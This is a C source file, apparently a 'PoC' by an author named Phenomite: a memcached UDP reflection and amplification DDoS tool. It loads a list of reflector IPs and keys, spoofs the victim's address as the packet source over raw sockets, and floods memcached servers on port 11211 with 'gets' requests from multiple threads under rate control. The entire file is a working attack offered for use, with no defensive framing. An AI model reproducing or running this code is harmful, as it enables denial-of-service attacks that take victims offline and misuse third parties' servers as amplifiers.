/*-------------------------------
Memcache 2019 - Whipping a dead horse.
Cancerous C script by Phenomite.

Generates memcacheD payload dynamically based on a list of space delimited keys.
A filter script will build the following:

Format: <ip>\t<keys>

Ranges from 1 key to `n` maximum defined in the filter script I made.
Each key will potentially be over 1mb of data, depending on the argument passed
to filter script.

Keys will be delimited by space, meaning the other non-memcached space is a tab
(or \t). This tab will be used to space ip's from keys.

-------------------------------*/
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
static unsigned int DPORT = 11211;

struct list {
  struct sockaddr_in data;
  char items[512];
  struct list *next;
  struct list *prev;
};
struct list *head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list *list_node;
  struct sockaddr_in sin;
};

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
  iph->id = htonl(rand() % 65400 + 1);
  iph->frag_off = 0;
  iph->ttl = MAXTTL; // 64
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  iph->saddr = inet_addr("127.0.0.1");
}
void setup_udp_header(struct udphdr *udph) {
  udph->source = htons(rand() % 20000 + 40000);
  udph->dest = htons(DPORT);
  udph->check = 0;
  memcpy((void *)udph + sizeof(struct udphdr), "\x01", 1);
  udph->len = htons(sizeof(struct udphdr) + 1);
}
void *flood(void *par1) {
  struct thread_data *td = (struct thread_data *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td->sin;
  struct list *list_node = td->list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  init_rand(time(NULL));
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_udp_header(udph);
  udph->source = htons(rand() % 20000 + 40000);
  iph->saddr = sin.sin_addr.s_addr;
  iph->daddr = list_node->data.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  while (1) {
    memset(datagram, 0, MAX_PACKET_SIZE);

    // Read in new keys for respective IP
    unsigned char PAYLOAD[700];
    list_node = list_node->next;
    strcpy(PAYLOAD, list_node->items);

    // Edit payload and set
    unsigned int payloadlen = strlen(PAYLOAD);
    unsigned char newPAYLOAD[740] = "\x00\x01\x00\x00\x00\x01\x00\x00gets\x20";
    memcpy(newPAYLOAD + 13, PAYLOAD, payloadlen);
    memcpy(newPAYLOAD + 13 + payloadlen, "\n", 1);
    unsigned int PAYLOADSIZE = payloadlen + 14;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
    // iph->id = htonl(rand() % 65337 + 1);
    iph->frag_off = 0;
    iph->ttl = MAXTTL; // 64
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    // iph->saddr = sin.sin_addr.s_addr;
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);

    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

    udph->source = htons(rand() % 65337 + 80);
    udph->dest = htons(DPORT);
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), newPAYLOAD, PAYLOADSIZE);
    udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);

    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data,
           sizeof(list_node->data));
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
  }
}
void processMemPayload(char *lineStr, int lineIter) {
  int x;
  int bufferingSection = 0;
  char ipBuffer[32] = ""; // Store ip
  char payloadBuffer[700] =
      ""; // Will cause a segfault if filtered list exceeds this
  for (x = 0; x < strlen(lineStr); x++) {
    // Basically stop assigning chars to ip buffer when you hit a tab (meaning
    // you now are loading the payload) Reasoning for this is:
    // 1. I want multiple keys in the "payload" with spaces to separate
    // 2. The other memecache control character other than space is thus tab.
    if ((lineStr[x] == '\t') || (lineStr[x] == '\n') || (lineStr[x] == '\r')) {
      // buffer[strlen(buffer) - 1] = 0x00;
      bufferingSection++;
      continue;
    }
    if (bufferingSection == 1) {
      payloadBuffer[strlen(payloadBuffer)] = (char)lineStr[x];
    } else if (bufferingSection == 0) {
      ipBuffer[strlen(ipBuffer)] = (char)lineStr[x];
    }
  }

  if (head == NULL) {
    head = (struct list *)malloc(sizeof(struct list));
    bzero(&head->data, sizeof(head->data));
    head->data.sin_addr.s_addr = inet_addr(ipBuffer);
    strcpy(head->items, payloadBuffer);
    head->next = head;
    head->prev = head;
  } else {
    struct list *new_node = (struct list *)malloc(sizeof(struct list));
    memset(new_node, 0x00, sizeof(struct list));
    new_node->data.sin_addr.s_addr = inet_addr(ipBuffer);
    strcpy(new_node->items, payloadBuffer);
    new_node->prev = head;
    new_node->next = head->next;
    head->next = new_node;
  }
}
int main(int argc, char *argv[]) {
  if (argc < 6) {
    fprintf(stdout, "Phenom Meme Poc: %s host port ref-file thread pps time\n",
            argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Loading up those juicy reflectrs\n");
  int max_len = 700;
  char *buffer = (char *)malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE *list_fd = fopen(argv[3], "r");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    processMemPayload(buffer, i);
    i++;
  }
  struct list *current = head->next;
  pthread_t thread[num_threads];
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].list_node = current;
    pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
  }
  fprintf(stdout, "Doing the deed\n");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}